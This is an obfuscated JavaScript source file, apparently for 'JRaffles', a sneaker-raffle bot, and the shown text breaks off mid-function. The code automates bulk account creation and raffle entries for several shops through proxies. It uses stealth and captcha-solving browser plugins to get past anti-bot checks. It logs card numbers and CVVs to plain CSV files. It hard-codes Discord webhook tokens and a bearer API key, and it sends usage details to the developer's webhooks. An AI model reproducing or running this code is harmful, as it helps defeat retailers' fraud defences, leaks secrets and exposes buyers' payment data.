const { EmbedBuilder: _0x19d385 } = require('discord.js');
var _0x1b0644 = require('exe');
const { execFile: _0x493097 } = require('child_process'), _0x114f6 = require('puppeteer-extra'), _0x3b1867 = require('puppeteer-extra-plugin-recaptcha'), _0x51de99 = require('puppeteer-extra-plugin-stealth'), _0x3e492c = require('chalk'), _0x2768f8 = require('node-bash-title'), _0x16016b = require('fs'), _0x450114 = require('axios'), _0x11e366 = require('papaparse');
var _0x2f090a = require('random-name');
const _0x511317 = require('request');
var _0x465bea = require('prompt');
const _0x225238 = _0x511317['jar']();
var _0xc43b8d = {};
const _0x2f3875 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x41e74f = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x52bd4e = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x231c86 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x49c047 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x4dccd5 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x4b8bf7 = 'https://discord.com/api/webhooks/', _0xc733a = '' + _0x4b8bf7 + _0x52bd4e, _0x4f5698 = '' + _0x4b8bf7 + _0x231c86, _0x344e4d = '' + _0x4b8bf7 + _0x2f3875, _0x570583 = '' + _0x4b8bf7 + _0x41e74f, _0x45d3b5 = '' + _0x4b8bf7 + _0x49c047, _0x4cf4a8 = '' + _0x4b8bf7 + _0x4dccd5;
const _0x5a9a59 = JSON['parse'](_0x16016b['readFileSync']('../package.json', 'utf-8')), _0x44c289 = _0x5a9a59['version'];
var _0x2de798, _0x327247, _0xc13cd1, _0x388569, _0xaba2a9, _0x5823f0, _0x57b088, _0x61797;
const _0x532b13 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x47001b = ![];
const _0x2dd2d8 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x28e9b6 = '0123456789';
var _0x3edefc = _0x2dd2d8['split']('');
const _0x3597c7 = require('auto-git-update'), { PageEmittedEvents: _0x3ad004 } = require('puppeteer'), { getRandomValues: _0x437e32 } = require('crypto'), { resolve: _0x2fa305 } = require('path'), { Console: _0x34fcb7 } = require('console'), _0x1f35a8 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x5c8429 = new _0x3597c7(_0x1f35a8);
async function _0x36d402() {
    _0xaba2a9 = _0x16016b['readdirSync']('../proxies'), _0x388569 = _0x16016b['readdirSync']('../tasks'), !_0x16016b['existsSync']('../accounts/fenom.csv') && _0x16016b['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x16016b['existsSync']('../accounts/bstn.csv') && _0x16016b['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x16016b['existsSync']('../failed-tasks.csv') && _0x16016b['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x16016b['existsSync']('../successful-tasks.csv') && _0x16016b['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0xc43b8d = JSON['parse'](_0x16016b['readFileSync']('../settings.json', 'utf-8')), !_0xc43b8d['delay'] && (_0xc43b8d['delay'] = 0x2710, _0x16016b['writeFileSync']('../settings.json', JSON['stringify'](_0xc43b8d))), !_0xc43b8d['captchaKey'] && (_0xc43b8d['captchaKey'] = '', _0x16016b['writeFileSync']('../settings.json', JSON['stringify'](_0xc43b8d))), !_0xc43b8d['useRandomProxy'] && (_0xc43b8d['useRandomProxy'] = !![], _0x16016b['writeFileSync']('../settings.json', JSON['stringify'](_0xc43b8d))), !_0xc43b8d['webhook'] && (_0xc43b8d['webhook'] = '', _0x16016b['writeFileSync']('../settings.json', JSON['stringify'](_0xc43b8d))), _0xc43b8d['MahaDelay'] = _0xc43b8d['delay'], _0x4b8bf7 = _0xc43b8d['webhook'], _0x5823f0 = _0xc43b8d['licenseKey'];
}
let _0x10da56, _0x33efec = [], _0x377fbd;
const _0x1b3ea1 = _0x369ad2 => new Promise(_0x3fca6a => setTimeout(_0x3fca6a, _0x369ad2));
function _0x51cb94(_0x236e3a, _0x3556f6) {
    return Math['floor'](Math['random']() * (_0x3556f6 - _0x236e3a + 0x1) + _0x236e3a);
}
async function _0x1b3489(_0x2b0ef1) {
    return _0x450114['get']('https://api.hyper.co/v4/licenses/' + _0x2b0ef1, { 'headers': { 'Authorization': 'Bearer\x20' + _0x532b13 } })['then'](_0x9269f8 => _0x9269f8['data'])['catch'](() => null);
}
;
async function _0x4ea601(_0x1b544a) {
    console['clear']();
    if (_0x1b544a == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x2dd202 = await _0x465bea['get']('License');
        if (_0x2dd202['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x1b3ea1(0xbb8), _0x4ea601(_0x1b544a);
        _0x1b544a = _0x2dd202['License'], _0xc43b8d['licenseKey'] = _0x1b544a, _0x5823f0 = _0x1b544a, _0x16016b['writeFileSync']('../settings.json', JSON['stringify'](_0xc43b8d));
    }
    console['log']('Checking\x20license\x20' + _0x5823f0 + '...'), await _0x1b3ea1(0x320);
    const _0xe3a4e4 = await _0x1b3489(_0x1b544a);
    _0x57b088 = JSON['stringify'](_0xe3a4e4['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x61797 = JSON['stringify'](_0xe3a4e4['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0xe3a4e4)
        return console['log']('License\x20not\x20found');
    if (!_0xe3a4e4['user'])
        return console['log']('License\x20not\x20bound');
    return _0xe3a4e4['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x47001b = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x47001b = ![]);
}
async function _0x2f38dc() {
    var _0x3e1a7f = await _0x465bea['get']('Module');
    return console['clear'](), _0x3e1a7f['Module'];
}
;
async function _0x1b7918() {
    var _0x1e980f = await _0x465bea['get']('Setting');
    return console['clear'](), _0x1e980f['Setting'];
}
async function _0x50f62c() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0xc9236c = 0x0; _0xc9236c < _0x388569['length']; _0xc9236c++) {
        console['log']('\x20(' + _0xc9236c + ')\x20' + _0x388569[_0xc9236c]);
    }
    console['log']('');
    var _0x4a4fde = await _0x465bea['get']('Task');
    if (_0x4a4fde['Task'] > _0x388569['length'] - 0x1 || isNaN(_0x4a4fde['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1b3ea1(0x3e8), _0x50f62c();
    var _0x3362b7 = _0x16016b['readFileSync']('../tasks/' + _0x388569[_0x4a4fde['Task']], 'utf-8');
    return _0xc13cd1 = _0x11e366['parse'](_0x3362b7, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x3e492c['blue'](_0x388569[_0x4a4fde['Task']])), _0x2de798 = _0x388569[_0x4a4fde['Task']], _0xc13cd1;
}
async function _0x3624ea() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x724d6 = 0x0; _0x724d6 < _0xaba2a9['length']; _0x724d6++) {
        console['log']('\x20(' + _0x724d6 + ')\x20' + _0xaba2a9[_0x724d6]);
    }
    console['log']('');
    var _0x18c199 = await _0x465bea['get']('Proxies');
    if (_0x18c199['Proxies'] > _0xaba2a9['length'] - 0x1 || isNaN(_0x18c199['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1b3ea1(0x3e8), _0x3624ea();
    var _0x4c7f0f = _0x16016b['readFileSync']('../proxies/' + _0xaba2a9[_0x18c199['Proxies']], 'utf-8')['split']('\x0a');
    let _0x248c69 = _0x4c7f0f['map']((_0x30b9d6, _0x84037) => {
        sanatizeProxy = _0x30b9d6['replace']('\x0d', '');
        if (_0x4c7f0f[_0x84037 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x327247 = _0xaba2a9[_0x18c199['Proxies']], console['clear'](), _0x248c69;
}
async function _0x58eb8a() {
    var _0x47d48a = await _0x465bea['get']('Value');
    return console['clear'](), _0x47d48a['Value'];
}
async function _0x54642f(_0x4410db) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x1cca13 = 0x0; _0x1cca13 < _0x4410db['length']; _0x1cca13++) {
        console['log']('\x20(' + _0x1cca13 + ')\x20[' + _0x4410db[_0x1cca13]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x5c9d6e = await _0x465bea['get']('Module');
    return _0x5c9d6e['Module'];
}
async function _0x35af35() {
    var _0x337433 = await _0x465bea['get']('Password');
    return console['clear'](), _0x337433['Password'];
}
;
async function _0x8ed0fa() {
    var _0x177f5d = await _0x465bea['get']('Links');
    return _0x177f5d['Links'];
}
;
async function _0x1d2cf1() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x101e6e = 0x0; _0x101e6e < _0x33efec['length']; _0x101e6e++) {
        console['log']('\x20(' + _0x101e6e + ')\x20' + _0x33efec[_0x101e6e]);
    }
    ;
    console['log']();
    let _0x1ed05b = await _0x465bea['get']('Product');
    return console['clear'](), _0x1ed05b['Product'];
}
;
function _0x561248() {
    var _0x179e71 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x179e71;
}
;
function _0xe3afb4() {
    var _0x1f6677 = new Date(Date['now']())['toLocaleString']();
    return _0x1f6677['replace'](',', '');
}
const _0x5c60fc = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VFB8Tq',
                            'custom_source': 'Air\x20Jordan\x204\x20Seafoam',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RW67e2',
                                '$consent_form_version': 0x7d2f63,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'SQ43yf',
                            'custom_source': 'DZ5485-052',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WLQk7t',
                                '$consent_form_version': 0x7f71d6,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x57e113(_0x2e2de1, _0x4a1e20) {
    let _0x3281bf = { 'headers': { 'content-type': 'application/json' } };
    if (_0x44c289 != 'devkey') {
        await _0x450114['post'](_0x2e2de1, _0x4a1e20, _0x3281bf);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x555e75(_0x169db0, _0x26c577, _0x2a586d, _0x46f2c4, _0x425e10) {
    if (!_0x46f2c4 && _0x2a586d == 'dev') {
        var _0x114c8d = new _0x19d385()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x26c577['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x26c577['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x169db0['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0xc43b8d['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x57b088,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x169db0['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x44c289,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x114c8d['data'];
    } else {
        if (_0x46f2c4 && _0x2a586d == 'dev') {
            var _0x114c8d = new _0x19d385()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x26c577['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x57b088,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x26c577['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x169db0['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0xc43b8d['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x425e10,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x169db0['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x44c289,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x114c8d['data'];
        } else {
            if (_0x2a586d == 'pub') {
                var _0x114c8d = new _0x19d385()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x26c577['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x26c577['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x169db0['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0xc43b8d['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x169db0['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x44c289,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x114c8d['data'];
            } else {
                if (_0x2a586d == 'acc' && !_0x46f2c4) {
                    var _0x114c8d = new _0x19d385()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x26c577['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x57b088,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x26c577['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0xc43b8d['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x44c289,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x114c8d['data'];
                } else {
                    if (_0x2a586d == 'acc' && _0x46f2c4) {
                        var _0x114c8d = new _0x19d385()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x26c577['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x57b088,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x425e10,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x26c577['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0xc43b8d['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x44c289,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x114c8d['data'];
                    } else {
                        if (_0x2a586d == 'open') {
                            var _0x114c8d = new _0x19d385()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x61797)['addFields']({
                                'name': 'User',
                                'value': '' + _0x57b088,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x44c289,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x114c8d['data'];
                        } else {
                            if (!_0x46f2c4 && _0x2a586d == 'ver') {
                                var _0x114c8d = new _0x19d385()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x26c577['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x57b088,
                                    'inline': !![]
                                }, {
